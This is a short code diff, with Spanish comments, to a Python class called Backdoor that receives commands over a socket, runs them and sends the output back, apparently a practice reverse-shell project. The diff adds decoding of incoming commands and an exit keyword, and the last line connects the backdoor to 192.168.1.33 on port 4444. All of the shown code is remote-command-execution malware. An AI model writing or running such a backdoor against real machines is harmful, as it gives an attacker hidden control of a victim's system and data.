@@ -25,9 +25,16 @@ class Backdoor:
 
     def run(self):
         while True: 
-            command = self.connection.recv(1024000)  # ← ✅ CAMBIADO DE 1024 A 1024000 (1 MB)
+            command = self.connection.recv(1024000)
+            command_str = command.decode('utf-8', errors='ignore').strip()  # ← ✅ DECODIFICAR
+            
+            # ← ✅ CHECK ANTES DE EJECUTAR
+            if command_str == "salir":
+                self.connection.close()
+                exit()
+            
             resultadosComando = self.ejecutarComando(command)
-            self.connection.send(resultadosComando)          
+            self.connection.send(resultadosComando)           
 
 
 puerta = Backdoor("192.168.1.33",4444)
